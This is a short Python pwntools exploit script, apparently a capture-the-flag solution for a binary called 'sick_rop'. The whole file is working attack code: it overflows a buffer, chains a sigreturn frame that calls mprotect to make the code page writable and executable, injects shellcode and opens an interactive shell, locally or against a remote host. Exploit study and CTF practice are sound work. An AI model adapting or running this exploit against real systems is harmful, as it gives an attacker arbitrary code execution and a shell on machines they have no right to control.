#!/usr/bin/env python3

from pwn import *
import sys

PAGE = 0x400000 # Text page to set writable
PSIZE = 0x2000
OFFSET = 40 # Offset to overflow
SYS_RET = 0x401014
VULN_PTR = 0x4010d8 # Found with find in gdb

if __name__ == "__main__":
    IP, PORT = None, None
    if len(sys.argv) == 2:
        IP, PORT = sys.argv[1].split(':')
    else:
        print("Local writup... (add IP:PORT for remote)")

    context.binary = './sick_rop'
    prog = ELF('./sick_rop')

    rop = ROP(prog)
    rop.vuln()
    rop.call(SYS_RET)

    sr_frame = SigreturnFrame()
    sr_frame.rax = 10
    sr_frame.rdi = PAGE
    sr_frame.rsi = PSIZE
    sr_frame.rdx = 0x7
    sr_frame.rsp = VULN_PTR
    sr_frame.rip = SYS_RET

    print(asm(shellcraft.sh()))
    payloads = [
        b'\x42' * OFFSET + bytes(rop) + bytes(sr_frame),
        b'\x42' * 15,
        b'\x42' * OFFSET + pack(VULN_PTR + 16) + asm(shellcraft.sh()),
    ]

    run = connect(IP, PORT) if IP and PORT else process(prog.path)
    for pl in payloads:
        run.send(pl)
        run.recv()
    run.interactive()
